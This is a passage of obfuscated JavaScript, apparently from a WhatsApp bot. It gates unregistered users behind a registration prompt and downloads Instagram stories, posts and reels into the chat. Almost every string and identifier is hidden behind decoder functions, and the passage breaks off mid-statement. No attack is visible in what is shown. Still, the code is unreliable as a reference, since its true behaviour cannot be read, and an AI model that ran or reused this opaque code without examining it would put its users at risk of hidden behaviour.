Oq','zvCuWPJdVq','c2NdGCoeW7e','WQNcKCkBW6fG','gSowW6zGBG','uCk/ArDU','l2ldSCkhlW','q8k1W75iCW','WO7cRZa','WPSuhb4g','FtldLbTp','WQDaoJnG','WOFcG3pcNXS','FNWnWOa2','qqpdKY54','zwSbW5WD','o8kCW5ZcQ8kJ'];_0x27a5=function(){return _0x1c29ea;};return _0x27a5();}const sendButDoc=async(_0x4f76b6,_0x56766a,_0x2a48fe,_0x215c0c=[],_0x207103={})=>{const _0x5d7732={};_0x5d7732[_0xf2ee55(0x4ab,0x496,0x544,'O0KM',0x3b4)]=_0xf2ee55(0x262,0x35e,0x344,'fd8S',0x43e)+_0x278db6(0x30f,0x3d9,0x377,0x2e4,'IoZK'),_0x5d7732[_0x4ce634(0x2d5,'Q^1[',0x24e,0x2e0,0x2e0)]=_0x4ce634(0x1d6,'[@o(',0x170,0x19d,0x204)+_0x310bf5(-0xee,0x1,-0x110,-0xd8,'sKZr')+_0x4ce634(0x324,'Z*H*',0x1df,0x346,0x283)+_0x278db6(0x2aa,0x2c4,0x178,0x1da,'o5na')+_0x23040f(0x430,'#TxB',0x3f0,0x4ee,0x369)+_0x23040f(0x4fa,'72ZG',0x5e0,0x4b1,0x446)+_0x310bf5(-0xf6,-0x116,-0x136,-0xc5,'xN#E')+_0x23040f(0x409,'Xxsw',0x32a,0x35b,0x43a)+_0x310bf5(-0xef,-0xce,-0x10e,-0xc1,'kVPz')+_0x4ce634(0xf4,'Xxsw',0x143,0x1cf,0x146)+_0xf2ee55(0x3cf,0x4af,0x5a5,'DcAw',0x4e7)+_0x4ce634(0x21b,'fd8S',0x157,0x31,0x11d)+_0x23040f(0x4ae,'72ZG',0x480,0x55f,0x3ae)+_0xf2ee55(0x38e,0x421,0x4ab,'*qfs',0x363)+_0x278db6(0x2bb,0x18b,0x15f,0x254,'jyzu')+'nc',_0x5d7732[_0xf2ee55(0x2da,0x320,0x283,'72ZG',0x31c)]=_0x4ce634(0x293,'0(dB',0x213,0x3cc,0x2d6)+_0x278db6(0x1ce,0x232,0x373,0x2c7,'Z*H*')+_0x4ce634(0xe8,'nh)N',0x214,0x17f,0x1cc);function _0x278db6(_0x113c82,_0x41a416,_0x3acc74,_0x33a151,_0x31448d){return _0x4338be(_0x113c82-0xa0,_0x31448d,_0x3acc74-0x20,_0x33a151-0x2e6,_0x31448d-0x5c);}_0x5d7732[_0xf2ee55(0x381,0x35c,0x37a,'AMGb',0x422)]=_0x310bf5(-0xb9,-0x74,-0x4d,-0x140,'[um5')+_0x23040f(0x3ad,'Vw%7',0x388,0x2a9,0x471)+_0x4ce634(0x191,'Q^1[',0x10c,0x1fd,0x203)+_0x4ce634(0x112,'17)[',0x26f,0x302,0x1fc)+_0xf2ee55(0x495,0x4cc,0x49d,'L@Yh',0x43b)+_0x4ce634(0x102,']9]r',0x1dd,0x1e3,0x1d1)+_0x310bf5(-0xf5,-0x1a7,-0x113,-0x126,'72ZG')+_0xf2ee55(0x499,0x48b,0x3b3,'[gM^',0x3a8)+_0x23040f(0x4f7,'(NJt',0x4bb,0x55f,0x515),_0x5d7732[_0x4ce634(0x125,'2PQI',0x1e3,0xd7,0x17e)]=_0xf2ee55(0x4ea,0x45c,0x4b0,'kNYm',0x530)+_0x4ce634(0x20b,'jyzu',0x28,0xe4,0x121)+_0x4ce634(0xa1,'xN#E',0x21a,0x182,0x152)+_0x310bf5(-0x13,-0xb5,-0x2f,0x37,'R#zp'),_0x5d7732[_0x310bf5(-0x84,0x80,0x22,-0x15a,'mRLu')]=_0x4ce634(0x27d,'NM[Q',0xe0,0x250,0x1cb)+_0x23040f(0x46e,'nh)N',0x4a7,0x45d,0x523)+_0x278db6(0x22c,0x3ac,0x2a8,0x2d7,'kVPz')+_0xf2ee55(0x253,0x30f,0x2fb,'VNC9',0x32f)+_0x278db6(0x22b,0x243,0x286,0x21e,'(NJt')+_0x278db6(0x2ef,0x361,0x2e7,0x2c8,'xN#E')+_0x310bf5(0x38,0x33,-0xa6,-0x78,'[@o(')+_0xf2ee55(0x3e2,0x449,0x40d,'UJyi',0x4fc)+_0x278db6(0x1be,0x13b,0x1dc,0x204,']9]r'),_0x5d7732[_0x310bf5(-0x93,0x17,-0xea,0x12,'luhB')]=_0x278db6(0x134,0x11e,0x14a,0x1c8,'R#zp')+_0x310bf5(-0x2e,-0xe2,-0x80,-0x3d,'sKZr')+'ot',_0x5d7732[_0x4ce634(0x1c4,'*qfs',0x12b,0xfb,0x1e8)]=_0xf2ee55(0x3c4,0x311,0x3c7,'phS$',0x2b5)+_0x310bf5(-0x2,0x88,-0x2a,-0x44,'kNYm')+_0x4ce634(0x2fe,'NM[Q',0x386,0x1f5,0x2da)+_0x4ce634(0x3e0,'y*p]',0x2ba,0x220,0x2de)+_0x310bf5(-0x48,-0xb4,0x86,0xa8,'OEuv')+_0xf2ee55(0x3cd,0x3ca,0x492,'*&]P',0x30f)+_0x310bf5(-0x9c,-0x3e,-0x168,-0x148,'acSs')+_0x310bf5(-0x7e,-0x142,0x0,-0xac,'*&]P')+_0x4ce634(0x197,'72ZG',0x1a6,0xea,0x162);const _0x3e404e=_0x5d7732,_0x21127d={};_0x21127d[_0x23040f(0x4d0,'72ZG',0x466,0x4c5,0x4c1)+_0xf2ee55(0x3e0,0x410,0x4b5,'*qfs',0x476)+'t']=_0x56766a;function _0x4ce634(_0x5469e9,_0x308368,_0x1daff6,_0x3149c0,_0x397c1f){return _0x10d1cf(_0x5469e9-0x103,_0x308368,_0x1daff6-0x2d,_0x397c1f- -0x1f,_0x397c1f-0x17);}_0x21127d[_0x4ce634(0x311,'o5na',0x267,0x38e,0x2fa)+_0x310bf5(0xa4,0x1a6,0x98,0xda,'WAaD')]=_0x2a48fe,_0x21127d[_0x310bf5(-0xa9,-0x17a,-0xaf,-0x3a,'NM[Q')+'ns']=_0x215c0c,_0x21127d[_0x23040f(0x384,'o5na',0x484,0x2fe,0x3d9)+_0x310bf5(-0xd2,-0xb7,-0xc,-0xc5,'jyzu')]=_0x3e404e[_0x278db6(0x2cb,0x23c,0x2d7,0x20a,'2PQI')];function _0x310bf5(_0x1bca98,_0x56471e,_0x362b6d,_0x4748c6,_0x4c6ed4){return _0x10d1cf(_0x1bca98-0x12c,_0x4c6ed4,_0x362b6d-0x5f,_0x1bca98- -0x280,_0x4c6ed4-0x109);}_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')]={},_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0xf2ee55(0x240,0x2e0,0x3b3,'IoZK',0x2ba)]=_0x3e404e[_0x278db6(0x190,0x10a,0x1b6,0x18e,'xN#E')],_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0x278db6(0x183,0x278,0x155,0x1ab,']PAY')+_0x278db6(0x12f,0x161,0x2f4,0x1f8,'NM[Q')]=_0x3e404e[_0x4ce634(0x1e8,'pogp',0x329,0x366,0x284)],_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0xf2ee55(0x2fc,0x33b,0x3ce,'pogp',0x352)+_0x310bf5(-0x83,0x57,0xf,-0x16d,'XoX9')]=_0x3e404e[_0x4ce634(0x2d2,'*&]P',0x176,0x25a,0x25c)],_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0x4ce634(0x1be,'L@Yh',0xb0,0x249,0x163)+_0x278db6(0x241,0x28f,0xc2,0x194,'L@Yh')]=_0x3e404e[_0x310bf5(-0xe7,-0x56,-0xb7,-0x1cc,'R#zp')];function _0xf2ee55(_0x5380e9,_0x51c5d3,_0x46be1e,_0x57eed6,_0x2cf5ad){return _0x238807(_0x57eed6,_0x51c5d3-0x59,_0x46be1e-0xbc,_0x57eed6-0x7e,_0x51c5d3-0xb7);}function _0x23040f(_0x4a96d5,_0x4f2858,_0x439064,_0x4ae6e3,_0x190292){return _0x10d1cf(_0x4a96d5-0x195,_0x4f2858,_0x439064-0x183,_0x4a96d5-0x204,_0x190292-0x86);}_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0x4ce634(0x18c,'AMGb',0x1f6,0x1b6,0x159)+_0xf2ee55(0x2eb,0x2fd,0x31f,'0(dB',0x396)]=0x1e61,_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0xf2ee55(0x514,0x451,0x3d1,'nh)N',0x40d)+_0x310bf5(-0x49,0x50,-0x46,-0x10c,'zQ&Y')]=_0x3e404e[_0x278db6(0x18d,0x113,0x19d,0x1c1,'OEuv')],_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0x310bf5(-0x10e,-0x25,-0x47,-0x1a5,'o5na')+_0x23040f(0x3e4,'*qfs',0x3c5,0x32f,0x37f)]=_0x3e404e[_0x278db6(0x209,0x27a,0x236,0x18a,'[@o(')],_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0x23040f(0x345,'Z*H*',0x3da,0x29f,0x30a)+_0xf2ee55(0x370,0x362,0x3d6,'xN#E',0x43c)+_0x4ce634(0x1d0,']PAY',0x1a4,0x312,0x21b)]=_0x3e404e[_0x23040f(0x39f,'Z*H*',0x2aa,0x393,0x43f)],_0x21127d[_0xf2ee55(0x257,0x30b,0x367,'y*p]',0x241)+_0x310bf5(-0x129,-0x8c,-0x1f8,-0xa5,'luhB')+_0x310bf5(0x66,0x76,-0x98,0x4d,'y*p]')][_0x310bf5(0x8b,-0x23,0xd9,-0x50,'#Yln')+_0x278db6(0x3c9,0x273,0x38c,0x2d0,'IoZK')+_0x278db6(0x2ec,0x17f,0x171,0x261,'pogp')]=thumbnail;const _0x287443=_0x21127d;Zeeone[_0x278db6(0x28a,0x194,0x207,0x283,'L@Yh')+_0xf2ee55(0x31c,0x345,0x26a,'jyzu',0x2ba)+'e'](from,_0x287443,MessageType[_0x278db6(0x378,0x35d,0x364,0x306,'17)[')+_0xf2ee55(0x3c1,0x442,0x385,'acSs',0x3e6)+_0xf2ee55(0x390,0x41a,0x3de,'gGe6',0x402)],_0x207103);};if(autoregister){if(autoregister===![])return;const _0x384f6e={};_0x384f6e[_0x2dfcd2('sKZr',0x2a4,0x3a5,0x29a,0x1eb)+_0x322d85(0x148,'lXVw',0xcb,0x6e,0x137)+'t']=_0x322d85(0x228,'0(dB',0x172,0x126,0xc3)+'Y';const _0x42b736={};_0x42b736[_0x10d1cf(0x325,'O0KM',0x3d5,0x2d4,0x2a6)+_0x238807('#TxB',0x191,0x2df,0x345,0x28a)]=_0x2dfcd2('Xxsw',0x1e3,0x122,0x2c4,0x196)+'y',_0x42b736[_0x10d1cf(0x204,'17)[',0x309,0x300,0x256)+_0x4338be(-0x6a,'lXVw',-0x1b8,-0x15a,-0x6e)]=_0x384f6e,_0x42b736[_0x10d1cf(0x19e,'*qfs',0x1ed,0x28a,0x1c0)]=_0x238807('*qfs',0x3ca,0x2b1,0x3be,0x35d)+_0x322d85(0x18b,'acSs',0x10a,0x102,0xf1);const _0x505e19={};_0x505e19[_0x4338be(0x30,'Z*H*',-0x33,-0xd1,-0xeb)+_0x238807('Z*H*',0x305,0x391,0x493,0x3db)+'t']=_0x10d1cf(0x154,'72ZG',0x210,0x136,0xfa)+_0x4338be(-0x17f,'Q^1[',0x2c,-0xa2,0xb)+_0x238807('[gM^',0x333,0x3e2,0x44f,0x35a);const _0x3b89dc={};_0x3b89dc[_0x2dfcd2('[@o(',0x295,0x1e0,0x299,0x362)+_0x238807('Q^1[',0x298,0x1f9,0x2ff,0x2db)]=_0x322d85(0x117,'fd8S',0x77,0x107,0x63)+_0x2dfcd2('*&]P',0xc1,0x11a,0x125,0x19b)+'ff',_0x3b89dc[_0x10d1cf(0x1f5,'UJyi',0x36d,0x2c5,0x348)+_0x322d85(0x14a,'kVPz',0x103,0xce,0x1ab)]=_0x505e19,_0x3b89dc[_0x238807('#TxB',0x3b0,0x375,0x1a8,0x2aa)]=_0x4338be(-0x180,'NM[Q',-0x13b,-0x9c,0x3)+_0x10d1cf(0x87,'fd8S',0x23e,0x139,0x155);let gaklopo=[_0x42b736,_0x3b89dc];if(isCmd&&!isOwner&&!isCreator&&!Ofc[_0x10d1cf(0x1b1,']9]r',0x1f8,0x1cf,0x257)][_0x10d1cf(0x184,'QdN5',0x173,0x16e,0x15c)+'e']&&!isUser)return sendButMessage(from,_0x2dfcd2('luhB',0xcc,0x12,-0x13,0x1ca)+sender[_0x2dfcd2('kNYm',0x235,0x168,0x251,0x1e3)]('@')[-0x1*-0xa81+0x2*-0x7af+0x1*0x4dd]+(_0x10d1cf(0x1e6,'fd8S',0x14f,0x1c8,0x190)+_0x238807('72ZG',0x44e,0x433,0x428,0x3c7)+_0x322d85(-0x3b,'[gM^',-0x36,-0x3a,-0x11)+_0x10d1cf(0x210,'nh)N',0x29c,0x30c,0x23d)+_0x2dfcd2('xN#E',0xf5,0xcb,0x100,0x103)+_0x322d85(0x78,'2PQI',-0x23,-0x25,-0xb5)+_0x2dfcd2('VNC9',0x29f,0x33f,0x368,0x26a)+_0x4338be(0x12,'luhB',-0x42,-0x9b,0x16)+_0x4338be(-0xb8,'L@Yh',-0x93,-0x18a,-0x8d)+_0x322d85(0x15e,'#Yln',0xd6,0x16d,0xb0)+_0x2dfcd2('o5na',0x133,0x18d,0x150,0x9b)+_0x2dfcd2('xN#E',0x140,0x164,0x80,0x58)+_0x10d1cf(0x17a,'Q^1[',0x1d2,0x217,0x1f5)+_0x4338be(0x16,'pogp',0x12a,0x4b,0x4c)+_0x238807('UJyi',0x455,0x3e0,0x449,0x3b0)+_0x10d1cf(0x39f,'Vw%7',0x3dd,0x2e5,0x32c)+_0x238807('luhB',0x4ab,0x2f4,0x374,0x3bf)+_0x4338be(-0xfa,'Z*H*',-0x94,-0xb8,-0x15e)+_0x322d85(0x25c,'ijD7',0x163,0x1d9,0x120)+_0x238807('*hJO',0x465,0x35f,0x2be,0x368)+_0x322d85(0x166,'[gM^',0xe6,0xb9,-0x1)+_0x4338be(-0x99,'[gM^',-0x1d0,-0x141,-0x3b)+_0x4338be(-0x81,'72ZG',-0xde,-0x12,-0xba)+_0x10d1cf(0x2aa,'luhB',0x252,0x2c9,0x260)+_0x2dfcd2('VNC9',0x272,0x215,0x2b7,0x34a)+_0x238807('fd8S',0x367,0x34f,0x311,0x2a3)+_0x2dfcd2('Q^1[',0xe6,0x8d,-0x1c,0x122)+_0x322d85(0xca,'sKZr',0xd7,-0x24,0x1b6)),namabot+_0x238807('lXVw',0x3bf,0x3b9,0x1dc,0x2e0)+owner_name,gaklopo,{'quoted':Ofc,'contextInfo':{'mentionedJid':[sender]}});}switch(command){case _0x322d85(0x15a,'[um5',0x110,0x202,0x1e1)+'ry':case _0x4338be(-0x1f,']9]r',-0x112,-0x2a,0x7)+_0x10d1cf(0x39b,'2PQI',0x377,0x2c4,0x2e9):case _0x2dfcd2('#TxB',0x152,0x1f7,0x117,0x189)+_0x2dfcd2('17)[',0x14d,0xa3,0x11c,0x13e)+_0x238807('ijD7',0x352,0x3af,0x271,0x370):if(!q)return reply(_0x322d85(0x112,'o5na',0xc2,-0x2e,0x157)+_0x322d85(0x1cc,'xN#E',0x142,0x10d,0x199)+'a?');pape=q,hx[_0x322d85(-0x140,'NM[Q',-0x5b,-0x94,0xc)+'ry'](pape)[_0x322d85(0x254,'WAaD',0x173,0x17b,0x210)](async _0x1b8b4e=>{const _0x5aecd0={'vORcy':function(_0x173841,_0x1fca2d){return _0x173841(_0x1fca2d);},'BORcX':_0x21eafc(0x757,0x685,'lXVw',0x5ff,0x6a9)};function _0x339826(_0x469902,_0x3b2f03,_0x357c3d,_0x306686,_0x4092da){return _0x238807(_0x469902,_0x3b2f03-0x90,_0x357c3d-0x162,_0x306686-0x1ae,_0x357c3d-0x25f);}function _0x1c0d7e(_0x42d4df,_0x68e7f4,_0x50843d,_0xed4b26,_0xb471aa){return _0x4338be(_0x42d4df-0x4c,_0x42d4df,_0x50843d-0x195,_0xed4b26-0x143,_0xb471aa-0x4d);}function _0x1f28d7(_0x3e18f6,_0x118d77,_0x2733fa,_0x16afcd,_0x24680b){return _0x4338be(_0x3e18f6-0x195,_0x24680b,_0x2733fa-0x173,_0x3e18f6-0x2fa,_0x24680b-0x1b8);}let _0x437edb=await _0x5aecd0[_0x21eafc(0x6f1,0x5ef,'sKZr',0x62c,0x591)](getBuffer,_0x1b8b4e[_0x21eafc(0x5bd,0x69c,'[@o(',0x5ba,0x761)][_0x16b6d9(0x614,0x5bd,'sKZr',0x539,0x5cb)+_0x21eafc(0x704,0x6a7,'L@Yh',0x6df,0x5e1)+_0x1f28d7(0x1c1,0x234,0x1ef,0x268,'pogp')]);await Zeeone[_0x21eafc(0x580,0x5d3,'QdN5',0x613,0x5b4)+_0x1c0d7e('lXVw',0x1c,0xa1,-0x1e,0x32)+'e'](from,_0x437edb,image,{'thumbnail':_0x437edb,'quoted':ftroli,'caption':_0x1f28d7(0x273,0x185,0x288,0x328,'OEuv')+_0x1f28d7(0x2d1,0x21c,0x26c,0x22e,'0(dB')+_0x21eafc(0x634,0x62a,'QdN5',0x610,0x68c)+_0x1c0d7e('L@Yh',0xdf,0x1f,0x17,-0x1a)+'』'+enter+enter+(_0x21eafc(0x623,0x5e5,'y*p]',0x4eb,0x5df)+_0x1f28d7(0x219,0x2e0,0x122,0x157,'R#zp'))+_0x1b8b4e[_0x1f28d7(0x2c5,0x36b,0x24c,0x2d1,'17)[')]['id']+enter+(_0x16b6d9(0x52b,0x6ab,'XoX9',0x5db,0x664)+_0x339826('*&]P',0x5c0,0x58f,0x609,0x52d)+_0x16b6d9(0x4a8,0x428,'Z*H*',0x4b3,0x5b1))+_0x1b8b4e[_0x16b6d9(0x5dd,0x54b,'[um5',0x578,0x4ab)][_0x339826('72ZG',0x5c3,0x56d,0x61e,0x51d)+_0x1c0d7e('WAaD',0xed,0x122,0x13f,0x9e)]+enter+(_0x21eafc(0x7e7,0x729,'#TxB',0x676,0x819)+_0x21eafc(0x6aa,0x6de,'lXVw',0x5e5,0x67a)+_0x339826('luhB',0x4fc,0x5c3,0x677,0x668))+_0x1b8b4e[_0x1f28d7(0x2c5,0x383,0x395,0x354,'17)[')][_0x1c0d7e('luhB',0xc3,-0x95,-0x1,-0x62)+_0x1f28d7(0x309,0x26a,0x251,0x26e,'fd8S')]+enter+(_0x21eafc(0x653,0x681,'17)[',0x618,0x57f)+_0x16b6d9(0x403,0x4cc,'UJyi',0x439,0x366)+_0x339826('WAaD',0x466,0x559,0x485,0x499)+'\x20')+_0x1b8b4e[_0x1c0d7e('#TxB',0x71,-0x86,0x24,0xbd)][_0x16b6d9(0x41d,0x53b,'VNC9',0x512,0x597)+_0x339826('ijD7',0x53b,0x55d,0x583,0x5f2)]+enter+(_0x1c0d7e('lXVw',0x219,0x83,0x146,0x17c)+_0x1f28d7(0x168,0xa2,0x7e,0x249,'Q^1[')+_0x16b6d9(0x4e4,0x526,'zQ&Y',0x5b5,0x553)+'\x20')+_0x1b8b4e[_0x339826('pogp',0x585,0x579,0x62c,0x485)][_0x1f28d7(0x166,0x8e,0x205,0x12f,'Z*H*')+_0x1c0d7e(']9]r',-0x58,-0x149,-0x74,-0xdc)]+enter+(_0x339826('pogp',0x6b4,0x670,0x5bf,0x65e)+_0x1c0d7e('Xxsw',-0x8,-0xaa,-0x3c,-0x124)+_0x339826('[@o(',0x3dc,0x4a6,0x404,0x53f)+_0x1f28d7(0x26d,0x2ac,0x245,0x2d5,'Q^1[')+_0x1c0d7e('Z*H*',-0x3d,-0x13c,-0x78,-0xe5)+_0x339826('XoX9',0x681,0x651,0x5b5,0x70d)+_0x16b6d9(0x5be,0x48e,'17)[',0x561,0x502))+_0x1b8b4e[_0x1c0d7e('nh)N',0x9d,-0x17,-0x43,0x4)][_0x21eafc(0x648,0x73c,'nh)N',0x7e7,0x65e)+_0x16b6d9(0x4fa,0x5d0,'WAaD',0x5ad,0x4e1)]+enter+(_0x1c0d7e('gGe6',0x24,-0x1,0x51,-0x88)+_0x1f28d7(0x173,0x137,0x25c,0x1ae,'fd8S')+'*\x20')+_0x1b8b4e[_0x16b6d9(0x4f7,0x42e,'sKZr',0x44e,0x527)+'s'][_0x1f28d7(0x195,0x1de,0x295,0x136,'lXVw')+'h']+(_0x1c0d7e('lXVw',0x1e3,0x160,0x18c,0x267)+'a')+enter+enter+(_0x1f28d7(0x209,0x299,0x1a3,0x1e9,'WAaD')+_0x16b6d9(0x43c,0x584,'y*p]',0x49b,0x571)+_0x1f28d7(0x274,0x294,0x274,0x1f9,'2PQI')+_0x21eafc(0x6c8,0x64d,'L@Yh',0x6b5,0x63e)+_0x1f28d7(0x184,0x11e,0x25e,0x9f,'UJyi')+_0x16b6d9(0x4e9,0x5ec,'*&]P',0x5ae,0x641)+_0x339826('IoZK',0x490,0x4cf,0x4c4,0x4ac)+_0x339826('zQ&Y',0x3e2,0x498,0x581,0x48c)+'_')});function _0x16b6d9(_0x36ac92,_0x21e87b,_0x43f938,_0xe9d137,_0x2fee4c){return _0x10d1cf(_0x36ac92-0x1c,_0x43f938,_0x43f938-0x4e,_0xe9d137-0x2d1,_0x2fee4c-0x1d1);}function _0x21eafc(_0x1db77b,_0x473ba4,_0x2d52ba,_0x27ba16,_0x3795d9){return _0x238807(_0x2d52ba,_0x473ba4-0xa2,_0x2d52ba-0x7c,_0x27ba16-0x1c8,_0x473ba4-0x378);}for(let _0x2bdd0d of _0x1b8b4e[_0x339826('Xxsw',0x63b,0x647,0x685,0x643)+'s']){if(_0x2bdd0d[_0x1c0d7e('luhB',0x47,-0x18,0xd,-0x19)][_0x16b6d9(0x4a8,0x43b,'QdN5',0x458,0x47e)+_0x16b6d9(0x396,0x519,'[um5',0x475,0x573)](_0x5aecd0[_0x1c0d7e('NM[Q',0x0,0x3e,-0x66,-0x2)])){let _0x393cb3=await _0x5aecd0[_0x1c0d7e('UJyi',0x52,0x1de,0x113,0x13f)](getBuffer,_0x2bdd0d[_0x16b6d9(0x43c,0x39d,'IoZK',0x406,0x3fe)]);Zeeone[_0x1c0d7e('QdN5',0x54,-0x126,-0x36,-0x8f)+_0x21eafc(0x647,0x726,'[gM^',0x712,0x61f)+'e'](from,_0x393cb3,video,{'thumbnail':Buffer[_0x16b6d9(0x5a5,0x509,'fd8S',0x4ee,0x46e)](0xa85+0xe81+-0x1906),'quoted':Ofc,'caption':_0x1f28d7(0x1de,0xf4,0x182,0x255,'jyzu')+_0x16b6d9(0x4e1,0x42e,'jyzu',0x471,0x3ad)+'•\x20'+_0x2bdd0d[_0x1c0d7e('NM[Q',0x32,0x92,-0x23,0xd)]});}else{let _0x25d591=await _0x5aecd0[_0x16b6d9(0x3f3,0x3f7,'luhB',0x405,0x4e1)](getBuffer,_0x2bdd0d[_0x1c0d7e('[um5',0xb5,0xa1,0x175,0x176)]);Zeeone[_0x1f28d7(0x1c6,0x1d7,0x107,0x293,']PAY')+_0x1c0d7e('0(dB',0x87,0x92,0x3d,0x1e)+'e'](from,_0x25d591,image,{'thumbnail':Buffer[_0x16b6d9(0x42a,0x484,']PAY',0x3ff,0x4ce)](-0x254f+-0x775+-0x6*-0x776),'quoted':Ofc,'caption':_0x16b6d9(0x661,0x6b9,'WAaD',0x5da,0x5b5)+_0x339826('OEuv',0x618,0x526,0x4cb,0x4fa)+'•\x20'+_0x2bdd0d[_0x1c0d7e('UJyi',-0x55,-0x8c,0x5e,-0x68)]});}}})[_0x10d1cf(0x238,'#TxB',0x360,0x2a4,0x2a9)](_0x58567a=>reply(_0x238807('*&]P',0x284,0x256,0x21a,0x307)+_0x2dfcd2('Z*H*',0x9b,0xf2,0x16d,0x157)+_0x238807('XoX9',0x487,0x3fb,0x48b,0x414)+_0x238807('Z*H*',0x494,0x4bd,0x2e1,0x3dc)+_0x238807('AMGb',0x421,0x2a6,0x261,0x350)+_0x4338be(0xae,'lXVw',-0xb4,-0x46,0x50)+_0x322d85(-0x9,'OEuv',0x73,0x9f,0xc3)+_0x322d85(0x231,']9]r',0x19d,0x1cb,0x19d)+_0x4338be(-0x6e,'acSs',-0xb7,-0x14d,-0x109)));break;case'ig':case _0x2dfcd2('O0KM',0x27a,0x1a9,0x27f,0x261):case _0x322d85(-0xa6,'IoZK',0x4d,0x11a,0xb8)+'to':case _0x322d85(0x18b,'AMGb',0x118,0x6c,0x5b)+_0x4338be(-0x12e,'L@Yh',-0xea,-0xec,-0xdb):case _0x238807('kVPz',0x36c,0x43f,0x469,0x3f6)+_0x10d1cf(0x215,'QdN5',0x1c9,0x131,0xbf):case _0x4338be(-0x8,'luhB',-0x93,-0x2e,0x2f)+'o':case _0x4338be(-0x19b,'phS$',-0x1a8,-0x112,-0xd3)+'eo':case _0x322d85(0x13e,'VNC9',0xd1,0x190,-0x1e)+_0x238807('Xxsw',0x1b9,0x137,0x174,0x227):case _0x4338be(-0x29,'[@o(',-0x177,-0xed,-0x1b0)+_0x10d1cf(0x22c,'o5na',0x2c8,0x263,0x202):case _0x322d85(0xbb,'UJyi',-0x38,0x75,-0x5)+'ls':case _0x4338be(-0x208,'y*p]',-0x190,-0x138,-0xe9)+_0x10d1cf(0x1c5,'#TxB',0x2fa,0x277,0x174):case _0x322d85(0xa7,'fd8S',-0x58,-0x30,-0xbe)+_0x2dfcd2(']9]r',0xbb,0x128,0x1b3,0x7f):case _0x10d1cf(0x1f9,'zQ&Y',0x17e,0x1c0,0x13c):case _0x322d85(0x25,'Xxsw',0x101,0x157,0xbe)+'tv':if(!isUrl(args[-0xe97+0x14a+-0x2a9*-0x5])&&!args[0x15ea+0x1b0d+0x221*-0x17][_0x322d85(0x1b6,'OEuv',0xe0,0x22,0xd)+_0x4338be(-0x3a,'*&]P',-0xa1,-0x21,-0xd6)](_0x10d1cf(0x1cb,'*hJO',0x19f,0x250,0x2a6)+_0x10d1cf(0x165,'mRLu',0x129,0x229,0x29f)+_0x10d1cf(0x2ca,'Z*H*',0x1d5,0x2ac,0x1f2)))return reply(mess[_0x10d1cf(0x1a2,'acSs',0x2e0,0x26b,0x2c4)+_0x4338be(0x22,'#Yln',-0x1af,-0xd5,-0x20)]);let urlnya=q;hx[_0x10d1cf(0x161,'Q^1[',0x43,0x12a,0xc0)](urlnya)[_0x322d85(0x19a,'acSs',0xfc,0x2b,0xec)](async _0x2b4f6a=>{function _0x3632f7(_0x42749c,_0x4027fb,_0x468fe,_0x56b665,_0x11b32f){return _0x10d1cf(_0x42749c-0x22,_0x42749c,_0x468fe-0x76,_0x56b665- -0xeb,_0x11b32f-0x1e3);}function _0x1330ca(_0x3e8588,_0x16905c,_0x149e0b,_0x8b6c04,_0x7cc949){return _0x10d1cf(_0x3e8588-0x30,_0x8b6c04,_0x149e0b-0x1c7,_0x149e0b-0x440,_0x7cc949-0x1d8);}function _0x18cb39(_0x2968c7,_0x51b14e,_0x31f790,_0x4cf4d1,_0x5ef856){return _0x4338be(_0x2968c7-0x7b,_0x31f790,_0x31f790-0xc5,_0x4cf4d1-0x626,_0x5ef856-0x144);}function _0x2b6451(_0x33d8c8,_0x213727,_0x381155,_0x3e9045,_0x4ae708){return _0x2dfcd2(_0x4ae708,_0x381155- -0x1f1,_0x381155-0xda,_0x3e9045-0x10f,_0x4ae708-0x13f);}function _0x599033(_0x5a45d5,_0x4d3758,_0x2df1c4,_0x4f745a,_0x4cc047){return _0x322d85(_0x5a45d5-0x9f,_0x4cc047,_0x4f745a- -0x150,_0x4f745a-0x1e6,_0x4cc047-0xbd);}const _0x235f00={'zIYhW':function(_0x4f1d2e,_0x3762ae){return _0x4f1d2e(_0x3762ae);},'BDJnO':_0x2b6451(-0x7,-0x13,-0x29,0x34,'kVPz'),'IDnTZ':function(_0x438e40,_0x1b4422){return _0x438e40(_0x1b4422);},'Owzzb':function(_0x560fcb,_0x2a9467){return _0x560fcb(_0x2a9467);}};let _0xf747f3=await _0x235f00[_0x2b6451(0x20,-0xc2,-0xc2,-0xb3,'*hJO')](getBuffer,_0x2b4f6a[_0x2b6451(-0x123,-0x4a,-0x79,-0x10d,'zQ&Y')][_0x18cb39(0x56f,0x524,'o5na',0x472,0x481)+_0x18cb39(0x4f1,0x484,'XoX9',0x552,0x4d8)+_0x3632f7('*hJO',0x112,0x18f,0x188,0x190)]);await 